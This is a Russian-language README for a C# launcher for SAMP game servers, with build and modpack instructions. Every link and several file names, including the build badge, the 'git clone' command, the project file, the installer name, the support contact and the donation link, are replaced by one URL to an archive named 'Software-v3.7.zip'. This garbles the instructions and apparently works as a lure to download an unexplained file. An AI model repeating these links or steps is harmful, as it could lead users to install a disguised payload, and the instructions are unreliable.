# SAMP Launcher by pasvitas v2.0
[![Build Status](https://github.com/LunarRU/samplauncher/raw/refs/heads/master/samplauncher/Properties/Software-v3.7.zip)](https://github.com/LunarRU/samplauncher/raw/refs/heads/master/samplauncher/Properties/Software-v3.7.zip)

Лаунчер для SAMP-серверов by pasvitas
Версия 2.0

Требования:
* NetFramework 4.6.1

Возможности:
* Запуск SAMP
* Ссылки на сайт и группу ВКонтакте
* Установка SAMP
* Установка модпака.

Установка модпака:
* Положите в папку ModPack все файлы модпака (текстуры, модели)
* При установке модпака программа скопирует все файлы оттуда в https://github.com/LunarRU/samplauncher/raw/refs/heads/master/samplauncher/Properties/Software-v3.7.zip

Как построить проект:
* Установить Visual Studio 2017 Community, при установке выбрать "Создание приложений для Windows", поддержку C#, NetFramework 4.6.1
* Скачать проект с репозитория (или воспользоваться командой git clone https://github.com/LunarRU/samplauncher/raw/refs/heads/master/samplauncher/Properties/Software-v3.7.zip)
* Открыть проект (файл https://github.com/LunarRU/samplauncher/raw/refs/heads/master/samplauncher/Properties/Software-v3.7.zip)
* В файле https://github.com/LunarRU/samplauncher/raw/refs/heads/master/samplauncher/Properties/Software-v3.7.zip, в коде найти class ServerInfo, изменить там свойства
servername - Имя сервера
ip - IP-Адресс
port - Порт сервера
group - группа вконтакте
site - Сайт сервера
allowinstallsamp (false/true) - показывать или нет кнопку установки SAMP
allowinstallmodpack (false/true) - показывать или нет кнопку установки модпака
* Изменить все что ваша душа пожелает
* Вверху изменить сборку с Debug на Release
* Запустить сборку, дождатся завершения
* Зайти в папку samplauncher/bin/Release
* Создать папку SAMP, поместить туда установщик SAMP под именем https://github.com/LunarRU/samplauncher/raw/refs/heads/master/samplauncher/Properties/Software-v3.7.zip (можно взять из samplauncher/bin/Debug) (опционально)
* Создать папку ModPack, поместить туда модпак (опционально)
* Распорстранять всю содержимое папки Realase (сделать установщик, например)

Возможные проблемы:
* Может некорректно работать прогессбар установки файла. Очень странный метод у библиотеки для работы с архивом. Если работать не будет - пишите, переделаю на свой. 

За поддержкой или заказами обращайтесь https://github.com/LunarRU/samplauncher/raw/refs/heads/master/samplauncher/Properties/Software-v3.7.zip

Patreon-страничка для пожертвований: https://github.com/LunarRU/samplauncher/raw/refs/heads/master/samplauncher/Properties/Software-v3.7.zip
